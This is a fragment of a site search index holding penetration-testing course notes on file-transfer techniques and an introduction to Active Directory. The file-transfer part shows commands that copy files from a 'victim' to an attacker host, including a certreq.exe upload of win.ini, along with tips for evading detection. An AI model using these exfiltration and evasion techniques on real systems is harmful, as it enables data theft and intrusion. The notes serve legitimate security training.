Copy from attacker to victim:  PS C:\\htb&gt; Copy-Item -Path C:\\samplefile.txt -ToSession $Session -Destination C:\\Users\\Administrator\\Desktop\\   Copy from victim to attacker:  PS C:\\htb&gt; Copy-Item -Path &quot;C:\\Users\\Administrator\\Desktop\\DATABASE.txt&quot; -Destination C:\\ -FromSession $Session   ","version":"Next","tagName":"h3"},{"title":"RDP​","type":1,"pageTitle":"File transfer","url":"/docs/Hacking/HTB Academy/File transfers#rdp","content":" Use copy-paste in the Remote Desktop Protocol (RDP).  If copy-past do not work, we can mount a disk using RDP.  rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files' xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer   Later, when we use the remote desktop, we can reach the shared disk in \\\\tsclient\\.  For Windows, we can use the application mstsc.exe remote desktop client.  ","version":"Next","tagName":"h3"},{"title":"Protect file transfers​","type":1,"pageTitle":"File transfer","url":"/docs/Hacking/HTB Academy/File transfers#protect-file-transfers","content":" Specially when dealing with sensitive data, it is recommended to encrypt the data before the transfer.  In Windows, we can use https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1 to encrypt the files with AES.  PS C:\\htb&gt; Import-Module .\\Invoke-AESEncryption.ps1 PS C:\\htb&gt; Invoke-AESEncryption -Mode Encrypt -Key &quot;p4ssw0rd&quot; -Path .\\scan-results.txt File encrypted to C:\\htb\\scan-results.txt.aes   In Linux, we can use openssl to encrypt the data:  adriangalera@htb[/htb]$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc   and decrypt it in the other side:  adriangalera@htb[/htb]$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd   ","version":"Next","tagName":"h2"},{"title":"Living off the land​","type":1,"pageTitle":"File transfer","url":"/docs/Hacking/HTB Academy/File transfers#living-off-the-land","content":" Some binary programs can be used to perform more tasks than intended. Some of these tasks are:  DownloadUploadCommand ExecutionFile R/WBypass  We can check if the binaries we have access can be used to do download or upload operations in the following websites:  https://lolbas-project.github.io/ for Windowshttps://gtfobins.github.io/ for Linux  For example, we can use certreq.exe to upload files:  C:\\htb&gt; certreq.exe -Post -config http://192.168.49.128:8000/ c:\\windows\\win.ini Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)   Or another example, we can use openssl to serve files:  openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem &lt; /tmp/LinEnum.sh   And download it in the other side:  openssl s_client -connect 10.10.10.32:80 -quiet &gt; LinEnum.sh   ","version":"Next","tagName":"h2"},{"title":"Detection​","type":1,"pageTitle":"File transfer","url":"/docs/Hacking/HTB Academy/File transfers#detection","content":" Usually there are mechanism to prevent this kind of file transfer. Most common tools to perform file transfer reveals known User-Agents.  In order to avoid detection, a good idea might be to change the user agent of the tool used (if possible).  Additionally, the mere execution of a blacklisted binary, might trigger some alarms.  We can use GTFOBins or LOLBas to find binaries that will do the thing we need and are not blacklisted. ","version":"Next","tagName":"h2"},{"title":"Introduction to Active Directory","type":0,"sectionRef":"#","url":"/docs/Hacking/HTB Academy/Introduction to Active Directory","content":"","keywords":"","version":"Next"},{"title":"Active Directory Structure​","type":1,"pageTitle":"Introduction to Active Directory","url":"/docs/Hacking/HTB Academy/Introduction to Active Directory#active-directory-structure","content":" Active Directory is arranged in a hierarchical tree structure, with a forest at the top containing one or more domains, which can themselves have nested subdomains.  A forest is the security boundary within which all objects are under administrative control. A forest may contain multiple domains, and a domain may include further child or sub-domains. A domain is a structure within which contained objects (users, computers, and groups) are accessible. It has many built-in Organizational Units (OUs), such as Domain Controllers, Users, Computers, and new OUs can be created as required. OUs may contain objects and sub-OUs, allowing for the assignment of different group policies.  One example of such tree structure might be:  INLANEFREIGHT.LOCAL/ ├── ADMIN.INLANEFREIGHT.LOCAL │ ├── GPOs │ └── OU │ └── EMPLOYEES │ ├── COMPUTERS │ │ └── FILE01 │ ├── GROUPS │ │ └── HQ Staff │ └── USERS │ └── barbara.jones ├── CORP.INLANEFREIGHT.LOCAL └── DEV.INLANEFREIGHT.LOCAL   It is common to see multiple domains (or forests) linked together via trust relationships in organizations that perform a lot of acquisitions. It is often quicker and easier to create a trust relationship with another domain/forest than recreate all new users in the current domain. Domain trusts can introduce a slew of security issues if not appropriately administered.  ","version":"Next","tagName":"h2"},{"title":"Active Directory Terminology​","type":1,"pageTitle":"Introduction to Active Directory","url":"/docs/Hacking/HTB Academy/Introduction to Active Directory#active-directory-terminology","content":" Object: An object can be defined as ANY resource present within an Active Directory environment such as OUs, printers, users, domain controllers, etc.  Attributes: Every object in Active Directory has an associated set of attributes used to define characteristics of the given object. A computer object contains attributes such as the hostname and DNS name. All attributes in AD have an associated LDAP name that can be used when performing LDAP queries, such as displayName for Full Name and given name for First Name.  Schema: The Active Directory schema is essentially the blueprint of any enterprise environment. It defines what types of objects can exist in the AD database and their associated attributes. It lists definitions corresponding to AD objects and holds information about each object.  Domain: A domain is a logical group of objects such as computers, users, OUs, groups, etc. We can think of each domain as a different city within a state or country. Domains can operate entirely independently of one another or be connected via trust relationships.  Forest: A forest is a collection of Active Directory domains. It is the topmost container and contains all of the AD objects. A forest can contain one or multiple domains and be thought of as a state in the US or a country within the EU.  Tree: A tree is a collection of Active Directory domains that begins at a single root domain. A forest is a collection of AD trees.  Container: Container objects hold other objects and have a defined place in the directory subtree hierarchy.  Leaf: Leaf objects do not contain other objects and are found at the end of the subtree hierarchy.  Global Unique Identifier (GUID): A GUID is a unique 128-bit value assigned when a domain user or group is created. This GUID value is unique across the enterprise, similar to a MAC address. Every single object created by Active Directory is assigned a GUID, not only user and group objects. GUIDs are used by AD to identify objects internally. The ObjectGUID property never changes and is associated with the object for as long as that object exists in the domain.  Security principals: Security principals are anything that the operating system can authenticate, including users, computer accounts, or even threads/processes that run in the context of a user or computer account. In AD, security principals are domain objects that can manage access to other resources within the domain. Do not get confused with local user accounts or groups; these are not managed by AD.  Security Identifier (SID): A security identifier, or SID is used as a unique identifier for a security principal or security group. Every account, group, or process has its own unique SID, which, in an AD environment, is issued by the domain controller and stored in a secure database. A SID can only be used once. Even if the security principle is deleted, it can never be used again in that environment to identify another user or group. When a user logs in, the system creates an access token for them which contains the user's SID, the rights they have been granted, and the SIDs for any groups that the user is a member of.  Distinguished Name (DN): A Distinguished Name (DN) describes the full path to an object in AD (such as cn=bjones, ou=IT, ou=Employees, dc=inlanefreight, dc=local). In this example, the user bjones works in the IT department of the company Inlanefreight, and his account is created in an Organizational Unit (OU) that holds accounts for company employees. The Common Name (CN) bjones is just one way the user object could be searched for or accessed within the domain.  Relative Distinguished Name (RDN): A Relative Distinguished Name (RDN) is a single component of the Distinguished Name that identifies the object as unique from other objects at the current level in the naming hierarchy. In our example, bjones is the Relative Distinguished Name of the object. AD does not allow two objects with the same name under the same parent container, but there can be two objects with the same RDNs that are still unique in the domain because they have different DNs. For example, the object cn=bjones,dc=dev,dc=inlanefreight,dc=local would be recognized as different from cn=bjones,dc=inlanefreight,dc=local. DN should be unique in the whole directory, RDN should be unique in an OU.  sAMAccountName: The sAMAccountName is the user's logon name. Here it would just be bjones. It must be a unique value and 20 or fewer characters.  userPrincipalName: The userPrincipalName attribute is another way to identify users in AD. This attribute consists of a prefix (the user account name) and a suffix (the domain name) in the format of bjones@inlanefreight.local. This attribute is not mandatory.  FSMO Roles: Flexible Single Master Operation (FSMO) roles. These give Domain Controllers (DC) the ability to continue authenticating users and granting permissions without interruption (authorization and authentication). There are five FSMO roles: Schema Master and Domain Naming Master (one of each per forest), Relative ID (RID) Master (one per domain), Primary Domain Controller (PDC) Emulator (one per domain), and Infrastructure Master (one per domain).  Global Catalog: A global catalog (GC) is a domain controller that stores copies of ALL objects in an Active Directory forest. The GC stores a full copy of all objects in the current domain and a partial copy of objects that belong to other domains in the forest  Read-Only Domain Controller (RODC): A Read-Only Domain Controller (RODC) has a read-only Active Directory database.  Replication: Replication happens in AD when AD objects are updated and transferred from one Domain Controller to another.  Service Principal Name (SPN): A Service Principal Name (SPN) uniquely identifies a service instance. They are used by Kerberos authentication to associate an instance of a service with a logon account, allowing a client application to request the service to authenticate an account without needing to know the account name.  Group Policy Object (GPO): Group Policy Objects (GPOs) are virtual collections of policy settings. Each GPO has a unique GUID. A GPO can contain local file system settings or Active Directory settings. GPO settings can be applied to both user and computer objects. They can be applied to all users and computers within the domain or defined more granularly at the OU level.  Access Control List (ACL): An Access Control List (ACL) is the ordered collection of Access Control Entries (ACEs) that apply to an object.  Access Control Entries (ACEs): Each Access Control Entry (ACE) in an ACL identifies a trustee (user account, group account, or logon session) and lists the access rights that are allowed, denied, or audited for the given trustee.  Discretionary Access Control List (DACL): DACLs define which security principles are granted or denied access to an object; it contains a list of ACEs. When a process tries to access a securable object, the system checks the ACEs in the object's DACL to determine whether or not to grant access. If an object does NOT have a DACL, then the system will grant full access to everyone, but if the DACL has no ACE entries, the system will deny all access attempts. ACEs in the DACL are checked in sequence until a match is found that allows the requested rights or until access is denied.  System Access Control Lists (SACL): Allows for administrators to log access attempts that are made to secured objects. ACEs specify the types of access attempts that cause the system to generate a record in the security event log.  Fully Qualified Domain Name (FQDN): complete name for a specific computer or host. E.g.: DC01.INLANEFREIGHT.LOCAL. The format is [host name].[domain name].[tld].  Tombstone: A tombstone is a container object in AD that holds deleted AD objects. When an object is deleted from AD, the object remains for a set period of time known as the Tombstone Lifetime, and the isDeleted attribute is set to TRUE. Once an object exceeds the Tombstone Lifetime, it will be entirely removed.  AD Recycle Bin: Makes it easier for sysadmins to restore objects, avoiding the need to restore from backups, restarting Active Directory Domain Services (AD DS), or rebooting a Domain Controller.  SYSVOL: The SYSVOL folder, or share, stores copies of public files in the domain such as system policies, Group Policy settings, logon/logoff scripts, and often contains other types of scripts that are executed to perform various tasks in the AD environment.  AdminSDHolder: The AdminSDHolder object is used to manage ACLs for members of built-in groups in AD marked as privileged. It acts as a container that holds the Security Descriptor applied to members of protected groups. The SDProp (SD Propagator) process runs on a schedule of each hour. When this process runs, it checks members of protected groups to ensure that the correct ACL is applied to them.  dsHeuristics: The dsHeuristics attribute is a string value set on the Directory Service object used to define multiple forest-wide configuration settings.  adminCount: The adminCount attribute determines whether or not the SDProp process protects a user. If the value is set to 0 or not specified, the user is not protected. If the attribute value is set to 1, the user is protected.  Active Directory Users and Computers (ADUC): ADUC is a GUI console commonly used for managing users, groups, computers, and contacts in AD.  ADSI Edit: It is a powerful GUI tool that allows a user to access AD at a much deeper level.  sIDHistory: This attribute holds any SIDs that an object was assigned previously. It is usually used in migrations so a user can maintain the same level of access when migrated from one domain to another. This attribute can potentially be abused if set insecurely, allowing an attacker to gain prior elevated access that an account had before a migration if SID Filtering (or removing SIDs from another domain from a user's access token that could be used for elevated access) is not enabled.  NTDS.DIT: The NTDS.DIT file can be considered the heart of Active Directory. It is stored on a Domain Controller at C:\\Windows\\NTDS\\ and is a database that stores AD data such as information about user and group objects, group membership, and, most important to attackers and penetration testers, the password hashes for all users in the domain. Once full domain compromise is reached, an attacker can retrieve this file, extract the hashes, and either use them to perform a pass-the-hash attack or crack them offline using a tool such as Hashcat to access additional resources in the domain.  MSBROWSE: MSBROWSE is a Microsoft networking protocol that was used in early versions of Windows-based local area networks (LANs) to provide browsing services. It was used to maintain a list of resources, such as shared printers and files, that were available on the network, and to allow users to easily browse and access these resources. Replace by SMB and CIFS.  ","version":"Next","tagName":"h2"},{"title":"Active Directory Objects​","type":1,"pageTitle":"Introduction to Active Directory","url":"/docs/Hacking/HTB Academy/Introduction to Active Directory#active-directory-objects","content":" ","version":"Next","tagName":"h2"},{"title":"Users​","type":1,"pageTitle":"Introduction to Active Directory","url":"/docs/Hacking/HTB Academy/Introduction to Active Directory#users","content":" These are the users within the organization's AD environment. A user object is considered a security principal and has a security identifier (SID) and a global unique identifier (GUID). User objects have many possible attributes, such as their display name, last login time, date of last password change, email address, account description, manager, address, and more.  ","version":"Next","tagName":"h3"},{"title":"Contacts​","type":1,"pageTitle":"Introduction to Active Directory","url":"/docs/Hacking/HTB Academy/Introduction to Active Directory#contacts","content":" A contact object is usually used to represent an external user and contains informational attributes such as first name, last name, email address, telephone number, etc. They are leaf objects and are NOT security principals (securable objects), so they don't have a SID, only a GUID.  ","version":"Next","tagName":"h3"},{"title":"Printers​","type":1,"pageTitle":"Introduction to Active Directory","url":"/docs/Hacking/HTB Academy/Introduction to Active Directory#printers","content":" A printer object points to a printer accessible within the AD network. Like a contact, a printer is a leaf object and not a security principal, so it only has a GUID. Printers have attributes such as the printer's name, driver information, port number, etc.  ","version":"Next","tagName":"h3"},{"title":"Computers​","type":1,"pageTitle":"Introduction to Active Directory","url":"/docs/Hacking/HTB Academy/Introduction to Active Directory#computers","content":" A computer object is any computer joined to the AD network (workstation or server). Computers are leaf objects because they do not contain other objects. However, they are considered security principals and have a SID and a GUID. Like users, they are prime targets for attackers since full administrative access to a computer (as the all-powerful NT AUTHORITY\\SYSTEM account) grants similar rights to a standard domain user and can be used to perform the majority of the enumeration tasks that a user account can.  ","version":"Next","tagName":"h3"},{"title":"Shared Folders​","type":1,"pageTitle":"Introduction to Active Directory","url":"/docs/Hacking/HTB Academy/Introduction to Active Directory#shared-folders","content":" A shared folder object points to a shared folder on the specific computer where the folder resides. Shared folders can have stringent access control applied to them and can be either accessible to everyone (even those without a valid AD account), open to only authenticated users (which means anyone with even the lowest privileged user account OR a computer account (NT AUTHORITY\\SYSTEM) could access it), or be locked down to only allow certain users/groups access. Anyone not explicitly allowed access will be denied from listing or reading its contents. Shared folders are NOT security principals and only have a GUID. A shared folder's attributes can include the name, location on the system, security access rights.  ","version":"Next","tagName":"h3"},{"title":"Groups​","type":1,"pageTitle":"Introduction to Active Directory","url":"/docs/Hacking/HTB Academy/Introduction to Active Directory#groups","content":" A group is considered a container object because it can contain other objects, including users, computers, and even other groups. A group has SID and GUID. It is considered a security principal. In AD, groups are a way to manage user permissions and access to other securable objects (both users and computers).  In Active Directory, we commonly see what are called &quot;nested groups&quot; (a group added as a member of another group), which can lead to a user(s) obtaining unintended rights. Nested group membership is something we see and often leverage during penetration tests. The tool BloodHound helps to discover attack paths within a network and illustrate them in a graphical interface.  ","version":"Next","tagName":"h3"},{"title":"Organizational Units (OUs)​","type":1,"pageTitle":"Introduction to Active Directory","url":"/docs/Hacking/HTB Academy/Introduction to Active Directory#organizational-units-ous","content":" An organizational unit, or OU from here on out, is a container that systems administrators can use to store similar objects for ease of administration.  For example, we may have a top-level OU called Employees and then child OUs under it for the various departments such as Marketing, HR, Finance, Help Desk, etc.  For example, we may want to set a specific password policy for privileged service accounts so these accounts could be placed in a particular OU and then have a Group Policy object assigned to it, which would enforce this password policy on all accounts placed inside of it.  ","version":"Next","tagName":"h3"},{"title":"Domain​","type":1,"pageTitle":"Introduction to Active Directory","url":"/docs/Hacking/HTB Academy/Introduction to Active Directory#domain","content":" A domain is the structure of an AD network. Domains contain objects such as users and computers, which are organized into container objects: groups and OUs. Every domain has its own separate database and sets of policies that can be applied to any and all objects within the domain.  ","version":"Next","tagName":"h3"},{"title":"Domain Controllers​","type":1,"pageTitle":"Introduction to Active Directory","url":"/docs/Hacking/HTB Academy/Introduction to Active Directory#domain-controllers","content":" Domain Controllers are essentially the brains of an AD network. They handle authentication requests, verify users on the network, and control who can access the various resources in the domain. All access requests are validated via the domain controller and privileged access requests are based on predetermined roles assigned to users. It also enforces security policies and stores information about every other object in the domain.  ","version":"Next","tagName":"h3"},{"title":"Sites​","type":1,"pageTitle":"Introduction to Active Directory","url":"/docs/Hacking/HTB Academy/Introduction to Active Directory#sites","content":" A site in AD is a set of computers across one or more subnets connected using high-speed links. They are used to make replication across domain controllers run efficiently.  ","version":"Next","tagName":"h3"},{"title":"Built-in​","type":1,"pageTitle":"Introduction to Active Directory","url":"/docs/Hacking/HTB Academy/Introduction to Active Directory#built-in","content":" In AD, built-in is a container that holds default groups in an AD domain. They are predefined when an AD domain is created.  ","version":"Next","tagName":"h3"},{"title":"Foreign Security Principals​","type":1,"pageTitle":"Introduction to Active Directory","url":"/docs/Hacking/HTB Academy/Introduction to Active Directory#foreign-security-principals","content":" A foreign security principal (FSP) is an object created in AD to represent a security principal that belongs to a trusted external forest.  ","version":"Next","tagName":"h3"},{"title":"Active Directory Functionality​","type":1,"pageTitle":"Introduction to Active Directory","url":"/docs/Hacking/HTB Academy/Introduction to Active Directory#active-directory-functionality","content":" There are five Flexible Single Master Operation (FSMO) roles. These roles can be defined as follows:  Roles\tDescriptionSchema Master\tThis role manages the read/write copy of the AD schema, which defines all attributes that can apply to an object in AD. Domain Naming Master\tManages domain names and ensures that two domains of the same name are not created in the same forest. Relative ID (RID) Master\tThe RID Master assigns blocks of RIDs to other DCs within the domain that can be used for new objects. The RID Master helps ensure that multiple objects are not assigned the same SID. Domain object SIDs are the domain SID combined with the RID number assigned to the object to make the unique SID. PDC Emulator\tThe host with this role would be the authoritative DC in the domain and respond to authentication requests, password changes, and manage Group Policy Objects (GPOs). The PDC Emulator also maintains time within the domain. Infrastructure Master\tThis role translates GUIDs, SIDs, and DNs between domains. This role is used in organizations with multiple domains in a single forest. The Infrastructure Master helps them to communicate. If this role is not functioning properly, Access Control Lists (ACLs) will show SIDs instead of fully resolved names.  Depending on the organization, these roles may be assigned to specific DCs or as defaults each time a new DC is added.  ","version":"Next","tagName":"h2"},{"title":"Trust​","type":1,"pageTitle":"Introduction to Active Directory","url":"/docs/Hacking/HTB Academy/Introduction to Active Directory#trust","content":" A trust is used to establish forest-forest or domain-domain authentication, allowing users to access resources in (or administer) another domain outside of the domain their account resides in. A trust creates a link between the authentication systems of two domains.  There are several trust types.  Trust Type\tDescriptionParent-child\tDomains within the same forest. The child domain has a two-way transitive trust with the parent domain. Cross-link\tA trust between child domains to speed up authentication. External\tA non-transitive trust between two separate domains in separate forests which are not already joined by a forest trust. This type of trust utilizes SID filtering. Tree-root\tA two-way transitive trust between a forest root domain and a new tree root domain. They are created by design when you set up a new tree root domain within a forest. Forest\tA transitive trust between two forest root domains.  Trusts can be transitive or non-transitive.  A transitive trust means that trust is extended to objects that the child domain trusts.In a non-transitive trust, only the child domain itself is trusted.  Trusts can be set up to be one-way or two-way (bidirectional).  In bidirectional trusts, users from both trusting domains can access resources.In a one-way trust, only users in a trusted domain can access resources in a trusting domain, not vice-versa. The direction of trust is opposite to the direction of access.  Often, domain trusts are set up improperly and provide unintended attack paths.  Also, trusts set up for ease of use may not be reviewed later for potential security implications.  Mergers and acquisitions can result in bidirectional trusts with acquired companies, unknowingly introducing risk into the acquiring company’s environment.  t is not uncommon to be able to perform an attack such as Kerberoasting against a domain outside the principal domain and obtain a user that has administrative access within the principal domain.  ","version":"Next","tagName":"h3"},{"title":"Active Directory Protocols​","type":1,"pageTitle":"Introduction to Active Directory","url":"/docs/Hacking/HTB Academy/Introduction to Active Directory#active-directory-protocols","content":" ","version":"Next","tagName":"h2"},{"title":"Kerberos​","type":1,"pageTitle":"Introduction to Active Directory","url":"/docs/Hacking/HTB Academy/Introduction to Active Directory#kerberos","content":" Kerberos is a stateless authentication protocol based on tickets instead of transmitting user passwords over the network. As part of Active Directory Domain Services (AD DS), Domain Controllers have a Kerberos Key Distribution Center (KDC) that issues tickets.  When a user initiates a login request to a system, they request a ticket from the KDC, encrypting the request with the user's password. If the KDC can decrypt the request (AS-REQ) using their password, it will create a Ticket Granting Ticket (TGT) and transmit it to the user.  The user then presents its TGT to a Domain Controller to request a Ticket Granting Service (TGS) ticket, encrypted with the associated service's NTLM password hash.  Finally, the client requests access to the required service by presenting the TGS to the application or service, which decrypts it with its password hash. If the entire process completes appropriately, the user will be permitted to access the requested service or application.  The password is never transmitted over the network.  The Kerberos Key Distribution Centre (KDC) does not record previous transactions (it is stateless). Instead, the Kerberos Ticket Granting Service ticket (TGS) relies on a valid Ticket Granting Ticket (TGT). It assumes that if the user has a valid TGT, they must have proven their identity.  More in depth:  KRB_AS_REQ: The user sends a timestamp encrypted with their password to the KDC. This is the request to the TGT (Ticket Granting Ticket).KRB_AS_REP: The KDC verifies the user information and generates and encrypts the TGT message with its private key (the secret key of the krbtgt account). Then, the TGT message is passed to the user.KRB_TGS_REQ: The user presents the TGT to the DC and request a Ticket Granting Service (TGS) to access certain serviceKRB_TGS_REP: The TGS is encrypted with the hash NTLM password of the service or computer account that is running the KDC.KRB_AP_REQ: The user presents the TGS to the service.  The Kerberos protocol uses port 88 (both TCP and UDP). When enumerating an Active Directory environment, we can often locate Domain Controllers by performing port scans looking for open port 88 using a tool such as Nmap.  ","version":"Next","tagName":"h3"},{"title":"DNS​","type":1,"pageTitle":"Introduction to Active Directory","url":"/docs/Hacking/HTB Academy/Introduction to Active Directory#dns","content":" DNS is used to resolve hostnames to IP addresses. Private internal networks use Active Directory DNS namespaces to facilitate communications between servers, clients, and peers. DNS are managed by the Domain Controllers.  We can perform nslookup and we'll get all the IPs of Domain Controller in the network:  PS C:\\htb&gt; nslookup INLANEFREIGHT.LOCAL Server: 172.16.6.5 Address: 172.16.6.5 Name: INLANEFREIGHT.LOCAL Address: 172.16.6.5   This is called forward DNS lookup, we can do the opposite, reverse DNS lookup: from IP, get the hostname:  PS C:\\htb&gt; nslookup 172.16.6.5 Server: 172.16.6.5 Address: 172.16.6.5 Name: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL Address: 172.16.6.5   We can know the IP of certain host:  PS C:\\htb&gt; nslookup ACADEMY-EA-DC01 Server: 172.16.6.5 Address: 172.16.6.5 Name: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL Address: 172.16.6.5   ","version":"Next","tagName":"h3"},{"title":"LDAP​","type":1,"pageTitle":"Introduction to Active Directory","url":"/docs/Hacking/HTB Academy/Introduction to Active Directory#ldap","content":" Active Directory supports Lightweight Directory Access Protocol (LDAP) for directory lookups. LDAP is an open-source and cross-platform protocol used for authentication against various directory services (such as AD).  AD stores user account information and security information such as passwords and facilitates sharing this information with other devices on the network. LDAP is the language that applications use to communicate with other servers that provide directory services. In other words, LDAP is how systems in the network environment can &quot;speak&quot; to AD.  An LDAP session begins by first connecting to an LDAP server, also known as a Directory System Agent. The Domain Controller in AD actively listens for LDAP requests, such as security authentication requests.  The relationship between AD and LDAP can be compared to Apache and HTTP. The same way Apache is a web server that uses the HTTP protocol, Active Directory is a directory server that uses the LDAP protocol.  There are two types of LDAP authentication:  Simple Authentication: This includes anonymous authentication, unauthenticated authentication, and username/password authentication. Simple authentication means that a username and password create a BIND request to authenticate to the LDAP server. SASL Authentication: The Simple Authentication and Security Layer (SASL) framework uses other authentication services, such as Kerberos, to bind to the LDAP server and then uses this authentication service (Kerberos in this example) to authenticate to LDAP.  LDAP authentication messages are sent in cleartext by default so anyone can sniff out LDAP messages on the internal network. It is recommended to use TLS encryption or similar to safeguard this information in transit.  ","version":"Next","tagName":"h3"},{"title":"MSRPC​","type":1,"pageTitle":"Introduction to Active Directory","url":"/docs/Hacking/HTB Academy/Introduction to Active Directory#msrpc","content":" MSRPC is Microsoft's implementation of Remote Procedure Call (RPC), an interprocess communication technique used for client-server model-based applications. Windows systems use MSRPC to access systems in Active Directory using four key RPC interfaces.  Protocol\tDescriptionlsarpc\tA set of RPC calls to the Local Security Authority (LSA) system which manages the local security policy on a computer, controls the audit policy, and provides interactive authentication services. LSARPC is used to perform management on domain security policies. netlogon\tNetlogon is a Windows process used to authenticate users and other services in the domain environment. It is a service that continuously runs in the background. samr\tRemote SAM (samr) provides management functionality for the domain account database, storing information about users and groups. IT administrators use the protocol to manage users, groups, and computers by enabling admins to create, read, update, and delete information about security principles. Attackers (and pentesters) can use the samr protocol to perform reconnaissance about the internal domain using tools such as BloodHound to visually map out the AD network and create &quot;attack paths&quot; to illustrate visually how administrative access or full domain compromise could be achieved. Organizations can protect against this type of reconnaissance by changing a Windows registry key to only allow administrators to perform remote SAM queries since, by default, all authenticated domain users can make these queries to gather a considerable amount of information about the AD domain. drsuapi\tdrsuapi is the Microsoft API that implements the Directory Replication Service (DRS) Remote Protocol which is used to perform replication-related tasks across Domain Controllers in a multi-DC environment. Attackers can utilize drsuapi to create a copy of the Active Directory domain database (NTDS.dit) file to retrieve password hashes for all accounts in the domain, which can then be used to perform Pass-the-Hash attacks to access more systems or cracked offline using a tool such as Hashcat to obtain the cleartext password to log in to systems using remote management protocols such as Remote Desktop (RDP) and WinRM.  ","version":"Next","tagName":"h3"},{"title":"NTLM​","type":1,"pageTitle":"Introduction to Active Directory","url":"/docs/Hacking/HTB Academy/Introduction to Active Directory#ntlm","content":" Aside from Kerberos and LDAP, Active Directory uses several other authentication methods which can be used (and abused) by applications and services in AD. These include LM, NTLM, NTLMv1, and NTLMv2.  LM​  LAN Manager (LM or LANMAN) hashes are the oldest password storage mechanism used by the Windows operating system. If in use, they are stored in the SAM database on a Windows host and the NTDS.DIT database on a Domain Controller.  Due to significant security weaknesses in the hashing algorithm used for LM hashes, it has been turned off by default since Windows Vista/Server 2008.  Passwords using LM are limited to a maximum of 14 characters. Passwords are not case sensitive and are converted to uppercase before generating the hashed value, limiting the keyspace to a total of 69 characters making it relatively easy to crack these hashes using a tool such as Hashcat.  An LM hash takes the form of 299bd128c1101fd6.  NTHash (NTLM)​  NT LAN Manager (NTLM) hashes are used on modern Windows systems. It is a challenge-response authentication protocol and uses three messages to authenticate: a client first sends a NEGOTIATE_MESSAGE to the server, whose response is a CHALLENGE_MESSAGE to verify the client's identity. Lastly, the client responds with an AUTHENTICATE_MESSAGE. These hashes are stored locally in the SAM database or the NTDS.DIT database file on a Domain Controller.  NTLM is also vulnerable to the pass-the-hash attack, which means an attacker can use just the NTLM hash (after obtaining via another successful attack) to authenticate to target systems where the user is a local admin without needing to know the cleartext value of the password.  An NT hash takes the form of b4b9b02e6f09a9bd760f388b67351e2b, which is the second half of the full NTLM hash. An NTLM hash looks like this: Rachel:500:aad3c435b514a4eeaad3b935b51304fe:e46b9e548fa0d122de7f59fb6d48eaa2:::  Rachel is the username500 is the Relative Identifier (RID). 500 is the known RID for the administrator accountaad3c435b514a4eeaad3b935b51304fe is the LM hash and, if LM hashes are disabled on the system, can not be used for anythinge46b9e548fa0d122de7f59fb6d48eaa2 is the NT hash. This hash can either be cracked offline to reveal the cleartext value (depending on the length/strength of the password) or used for a pass-the-hash attack.  NTLMv1​  The protocol is used for network authentication, and the Net-NTLMv1 hash itself is created from a challenge/response algorithm. NTLMv1 uses both the NT and the LM hash, which can make it easier to &quot;crack&quot; offline after capturing a hash  NTLMv2​  Stronger alternative to NTLMv1. It is hardened against certain spoofing attacks that NTLMv1 is susceptible to.  Domain Cached Credentials (MSCache2)​  In an AD environment, the authentication methods mentioned in this section and the previous require the host we are trying to access to communicate with the &quot;brains&quot; of the network, the Domain Controller.  Microsoft developed the MS Cache v1 and v2 algorithm also known as Domain Cached Credentials (DCC) to solve the potential issue of a domain-joined host being unable to communicate with a domain controller.  Hosts save the last ten hashes for any domain users that successfully log into the machine in the HKEY_LOCAL_MACHINE\\SECURITY\\Cache registry key.  These hashes cannot be used in pass-the-hash attacks. Furthermore, the hash is very slow to crack with a tool such as Hashcat.  ","version":"Next","tagName":"h3"},{"title":"Users and Machine accounts​","type":1,"pageTitle":"Introduction to Active Directory","url":"/docs/Hacking/HTB Academy/Introduction to Active Directory#users-and-machine-accounts","content":" User accounts are created on both local systems (not joined to AD) and in Active Directory to give a person or a program (such as a system service) the ability to log on to a computer and access resources based on their rights.  When a user logs in, the system verifies their password and creates an access token. This token describes the security content of a process or thread and includes the user's security identity and group membership. Whenever a user interacts with a process, this token is presented.  Users can be assigned to groups that can contain one or more members. These groups can also be used to control access to resources.  Some users may have two or more accounts provisioned based on their job role (i.e., an IT admin or Help Desk member). Aside from standard user and admin accounts tied back to a specific user, we will often see many service accounts used to run a particular application or service in the background or perform other vital functions within the domain environment.  User accounts can be provisioned many rights in Active Directory: from very basic read-only user to Enterprise Admin and all the combinations in the middle. Because users can have so many rights assigned to them, they can also be misconfigured relatively easily and granted unintended rights that an attacker or a penetration tester can leverage.  ","version":"Next","tagName":"h2"},{"title":"Local accounts​","type":1,"pageTitle":"Introduction to Active Directory","url":"/docs/Hacking/HTB Academy/Introduction to Active Directory#local-accounts","content":" Local accounts are stored locally on a particular server or workstation. These accounts can be assigned rights on that host either individually or via group membership. Any rights assigned can only be granted to that specific host and will not work across the domain. There are some default local user accounts:  Administrator: this account has the SID S-1-5-domain-500. Has full control of the system. It cannot be deleted or locked, but it can be disabled or renamed. Guest: this account is disabled by default. The purpose of this account is to allow users without an account on the computer to log in temporarily with limited access rights. By default, it has a blank password and is generally recommended to be left disabled because of the security risk of allowing anonymous access to a host. SYSTEM: NT AUTHORITY\\SYSTEM account. Default account installed and used by the operating system to perform many of its internal functions. SYSTEM is a service account and does not run entirely in the same context as a regular user. A SYSTEM account is the highest permission level one can achieve on a Windows host and, by default, is granted Full Control permissions to all files on a Windows system. Network Service: This is a predefined local account used by the Service Control Manager (SCM) for running Windows services. When a service runs in the context of this particular account, it will present credentials to remote services. Local Service: This is another predefined local account used by the Service Control Manager (SCM) for running Windows services. It is configured with minimal privileges on the computer and presents anonymous credentials to the network.  ","version":"Next","tagName":"h3"},{"title":"Domain users​","type":1,"pageTitle":"Introduction to Active Directory","url":"/docs/Hacking/HTB Academy/Introduction to Active Directory#domain-users","content":" They are granted rights from the domain to access resources such as file servers, printers, intranet hosts, and other objects based on the permissions granted to their user account or the group that account is a member of. Domain user accounts can log in to any host in the domain, 